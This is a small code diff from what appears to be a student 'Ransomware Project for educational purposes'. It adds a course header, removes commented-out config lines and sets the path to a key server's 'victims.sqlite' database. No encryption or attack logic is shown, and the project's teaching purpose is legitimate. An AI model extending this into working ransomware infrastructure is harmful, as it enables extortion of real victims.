@@ -1,8 +1,14 @@
+# --------------------------------------------
+# Ransomware Project for educational purposes
+# Course : Security integration
+# Bloc : 1
+# Group : IS4
+# Class : data
+# --------------------------------------------
+# Importations
+# --------------------------------------------
 import sqlite3
 import time
-#import configgetter
-
-#conf = configgetter.get_specific_data("../config.json", "victim_database")
 
 DB_FILENAME = 'serveur_cles/data/victims.sqlite'
 DEBUG_MODE = False
